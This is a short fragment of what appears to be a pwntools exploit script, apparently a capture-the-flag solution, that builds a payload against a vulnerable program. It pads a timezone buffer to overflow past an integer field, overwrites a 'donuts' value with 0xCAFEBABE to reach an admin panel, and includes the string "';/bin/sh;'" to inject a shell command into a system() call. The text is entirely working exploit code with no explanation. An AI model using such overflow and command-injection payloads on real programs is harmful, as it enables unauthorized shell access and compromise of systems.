...
# Payload parts
command_payload = b"';/bin/sh;'"                 # 10 bytes: inject into system(cmd)
padding_timezone = b"A" * (32 - len(command_payload))  # Pad to fill timezone
padding_money = b"B" * 4                         # Skip over 'money' (int)
donuts_value = p32(0xCAFEBABE)                   # Trigger admin panel
